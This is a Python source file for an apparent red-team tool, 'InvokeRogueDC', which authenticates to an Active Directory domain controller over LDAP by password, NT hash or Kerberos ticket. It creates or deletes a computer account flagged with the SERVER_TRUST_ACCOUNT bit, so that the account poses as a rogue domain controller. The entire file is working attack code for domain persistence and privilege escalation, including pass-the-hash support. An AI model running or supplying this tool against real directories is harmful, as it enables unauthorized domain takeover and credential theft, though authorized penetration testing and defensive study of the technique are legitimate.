import argparse
import os
import ldap3
from ldap3 import Server, Connection, NTLM, SASL, KERBEROS, ALL, MODIFY_ADD, SUBTREE
from ldap3.core.exceptions import LDAPBindError
from gssapi import Credentials
import random
import string
from impacket.krb5.ccache import CCache
from impacket.krb5.asn1 import AP_REQ, Authenticator, TGS_REP, seq_set
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5 import constants
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
from pyasn1.codec.ber import encoder, decoder
from pyasn1.type.univ import noValue
import datetime
from binascii import unhexlify

def ldap_authentication(dc_ip, ldap_encryption, username, password, nthash, aesKey ,domain, kerberos):
    """
    Connect to an LDAP server using NTLM or Kerberos authentication.
    """
    if not dc_ip or not username or not domain :
        raise ValueError("[-] DC host, Username, and Domain are required.")

    # Build the server URL based on the encryption method
    if ldap_encryption == "ldaps":
        server_url = f"ldaps://{dc_ip}"
        use_ssl = True
        use_start_tls = False
    elif ldap_encryption == "ldap-starttls":
        server_url = f"ldap://{dc_ip}"
        use_ssl = False
        use_start_tls = True

    server = Server(server_url, use_ssl=use_ssl, get_info=ALL)
    # NTLM authentication
    if kerberos == False:
        user_dn_ntlm = f"{domain}\\{username}"

        if not (password or nthash):
            raise ValueError("[-] Password or NT hash is required for NTLM authentication.")
            
        if nthash:
            if len(nthash)!=32 and not nthash=='':
                raise ValueError("[-] Invalid NT hash.")
            password = "aad3b435b51404eeaad3b435b51404ee" + ":" + nthash

        try:
            with Connection(server, user=user_dn_ntlm, password=password, authentication=NTLM, auto_bind=True) as conn:
                if use_start_tls:
                    conn.start_tls()
                print("[+] Successfully authenticated using NTLM.")
                return conn
        except LDAPBindError as e:
            print(f"[-] NTLM authentication failed: {e}")
            return None

    # Kerberos authentication
    elif kerberos:
        #Kerberos with ldap-starttls not working (╯°□°）╯︵ ┻━┻
        conn = Connection(server, authentication=SASL, sasl_mechanism='GSS-SPNEGO')
        if not LDAP3KerberosLogin(conn, username, password, domain, nthash, aesKey):
            raise Exception("[-] Kerberos authentication failed.")
        print("[+] Successfully authenticated using Kerberos.")
        return conn
    else:
        raise ValueError("[-] Invalid authentication method. Choose NTLM or Kerberos.")

def LDAP3KerberosLogin(connection, user, password, domain='', nthash='', aesKey='', kdcHost=None, TGT=None, TGS=None, useCache=True):
    """
    Kerberos authentication using Impacket.
    """
    if len(nthash)!=32 and not nthash=='':
        raise ValueError("[-] Invalid NT hash.")
    try:
        nthash = unhexlify(nthash)
    except TypeError:
        pass
    
    targetName = f'ldap/{connection.server.host}'

    if useCache:
        domain, user, TGT, TGS = CCache.parseFile(domain, user, targetName)
    
    userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    if TGT is None:
        if TGS is None:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain, None, nthash, aesKey, kdcHost)
            
    else:
            tgt = TGT['KDC_REP']
            cipher = TGT['cipher']
            sessionKey = TGT['sessionKey']

    if TGS is None:
            serverName = Principal(targetName, type=constants.PrincipalNameType.NT_SRV_INST.value)
            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher, sessionKey)
    else:
            tgs = TGS['KDC_REP']
            cipher = TGS['cipher']
            sessionKey = TGS['sessionKey']

    blob = SPNEGO_NegTokenInit()

    blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]

    tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
    ticket = Ticket()
    ticket.from_asn1(tgs['ticket'])

    apReq = AP_REQ()
    apReq['pvno'] = 5
    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
    apReq['ap-options'] = constants.encodeFlags([])
    seq_set(apReq, 'ticket', ticket.to_asn1)

    authenticator = Authenticator()
    authenticator['authenticator-vno'] = 5
    authenticator['crealm'] = domain
    seq_set(authenticator, 'cname', userName.components_to_asn1)
    now = datetime.datetime.now(datetime.timezone.utc)
    authenticator['cusec'] = now.microsecond
    authenticator['ctime'] = KerberosTime.to_asn1(now)

    encodedAuthenticator = encoder.encode(authenticator)
    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 11, encodedAuthenticator, None)
    apReq['authenticator'] = noValue
    apReq['authenticator']['etype'] = cipher.enctype
    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
    blob['MechToken'] = encoder.encode(apReq)

    request = ldap3.operation.bind.bind_operation(connection.version, ldap3.SASL, user, None, 'GSS-SPNEGO', blob.getData())
    if connection.closed:
        connection.open(read_server_info=False)

    connection.sasl_in_progress = True
    response = connection.post_send_single_response(connection.send('bindRequest', request, None))
    connection.sasl_in_progress = False
    if response[0]['result'] != 0:
        raise Exception(response)
    connection.bound = True
    return True

def ldap_computer_exist(conn, computer_name, domain):
    """
    Check if a computer exists in the LDAP directory.
    """
    if not computer_name:
        raise ValueError("[-] Computer name is required.")

    search_base = ','.join([f"DC={part}" for part in domain.split('.')])
    search_filter = f'(sAMAccountName={computer_name}$)'
    conn.search(
        search_base=search_base,
        search_filter=search_filter,
        search_scope=SUBTREE,
        attributes=['distinguishedName']
    )

    if conn.entries:
        return conn.entries[0].distinguishedName.value
    return None

def ldap_create_computer(conn, computer_name, computer_pass, domain):
    """
    Create a new computer account in the LDAP directory.
    """
    if not computer_name :
        raise ValueError("[-] Computer name is required.")

    search_base = ','.join([f"DC={part}" for part in domain.split('.')])
    computer_dn = f"CN={computer_name},CN=Computers,{search_base}"
    computer_hostname = f"{computer_name.lower()}.{domain}"

    spns = [
        f"HOST/{computer_name}",
        f"HOST/{computer_hostname}",
        f"RestrictedKrbHost/{computer_name}",
        f"RestrictedKrbHost/{computer_hostname}"
    ]

    try:
        result = conn.add(
            dn=computer_dn,
            object_class=['top', 'person', 'organizationalPerson', 'user', 'computer'],
            attributes={
                'sAMAccountName': f"{computer_name}$",
                'userAccountControl': 0x82000,  # Domain controller: 0x82000 (532480)- SERVER_TRUST_ACCOUNT: 0x2000 (8192)
                'unicodePwd': ('"%s"' % computer_pass).encode('utf-16-le'),
                'dNSHostName': computer_hostname,
                'servicePrincipalName': spns
            }
        )
        if result:
            print(f"[+] Successfully created computer account: {computer_name}$ with password: {computer_pass}")
        else:
            print(f"[-] Error creating a machine account. Probably insufficient privileges.")
            print(conn.result)
    except Exception as e:
        print(f"[-] Failed to create computer account: {e}")

def generatePassword():
    """
    Create a password.
    """
    return ''.join(random.choice(string.ascii_uppercase + string.digits+ string.punctuation + string.ascii_lowercase)  for _ in range(32))

def delete_computer(conn,computer_name,domain):
    """
    Delete a computer account in the LDAP directory.
    """
    if not computer_name :
        raise ValueError("[-] Computer name is required.")

    search_base = ','.join([f"DC={part}" for part in domain.split('.')])
    computer_dn = f"CN={computer_name},CN=Computers,{search_base}"

    try:
        result =conn.delete(computer_dn)
        if result:
            print(f"[+] Computer has been deleted!")
        else:
            print(f"[-] Error creating a machine account. Probably insufficient privileges.")
            print(conn.result)
    except Exception as e:
        print(f"[-] Failed to delete computer account: {e}")

def invoke_ascii_art():
    ascii_art=r"""

     ___                 _        ____                        ____   ____
    |_ _|_ ____   _____ | | _____|  _ \ ___   __ _ _   _  ___|  _ \ / ___|
     | || '_ \ \ / / _ \| |/ / _ \ |_) / _ \ / _` | | | |/ _ \ | | | |
     | || | | \ V / (_) |   <  __/  _ < (_) | (_| | |_| |  __/ |_| | |___
    |___|_| |_|\_/ \___/|_|\_\___|_| \_\___/ \__, |\__,_|\___|____/ \____|
                                             |___/

    ________________
    |               |
    |  ___________  |
    | |           | |
    | |  ROGUE    | |
    | |    DC     | |
    | |___________| |
    |               |
    |  [|||||||]    |
    |  [|||||||]    |
    |  [|||||||]    |
    |               |
    |    ____       |
    |   |    |      |
    |   '----'      |
    |_______________|

        Made by Wuentin

"""

    return ascii_art

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Create a computer account that will act as a domain controller.")
    parser.add_argument("--dc-host", required=True, help="Domain Controller.")
    parser.add_argument("--ldap-encryption", default="ldaps", choices=["ldaps", "ldap-starttls"], help="LDAP encryption method (Default : ldaps).")
    parser.add_argument("--username", "-u", required=True, help="Username for authentication.")
    parser.add_argument("--password", "-p", help="Password for authentication.")
    parser.add_argument("--nthash", "-H",default='',help="NT hash for authentication.")
    parser.add_argument("--aesKey", help="AES key to use for Kerberos Authentication")
    parser.add_argument("--domain", "-d", required=True, help="Domain name for authentication.")
    parser.add_argument("--kerberos","-k", default=False,action='store_true', help="Use Kerberos authentication instead NTLM.")
    parser.add_argument("--computer", required=True, help="Name of the computer to create in LDAP.")
    parser.add_argument("--computer-pass", help="Password for the new computer account.")
    parser.add_argument('--delete',default=False,action='store_true', help='Delete an existing computer.')

    print(invoke_ascii_art())
    args = parser.parse_args()

    

    try:
        conn = ldap_authentication(args.dc_host, args.ldap_encryption, args.username, args.password, args.nthash, args.aesKey, args.domain, args.kerberos)
        if conn:
            print("[+] Successfully connected to the LDAP server.")
            if (args.delete):
                # Check if the computer already exists
                computer_dn = ldap_computer_exist(conn, args.computer.replace("$", ""), args.domain)
                if computer_dn:
                    print(f"[+] Computer exists: {computer_dn}")
                    delete_computer(conn,args.computer.replace("$", ""), args.domain) 
                else:
                    print("[-] Computer not found. Cancel operation.")                              
            else:
                # Check if the computer already exists
                computer_dn = ldap_computer_exist(conn, args.computer.replace("$", ""), args.domain)
                if computer_dn:
                    print(f"[+] Computer already exists: {computer_dn}")
                else:
                    print("[-] Computer not found. Creating a new computer account.")
                    if args.computer_pass:
                        ldap_create_computer(conn, args.computer.replace("$", ""), args.computer_pass, args.domain)
                    else:
                        computer_pass=generatePassword()
                        ldap_create_computer(conn, args.computer.replace("$", ""), computer_pass, args.domain)
            conn.unbind()
        else:
            print("[-] Connection failed.")
    except Exception as e:
        print(f"[-] Error  : {e}")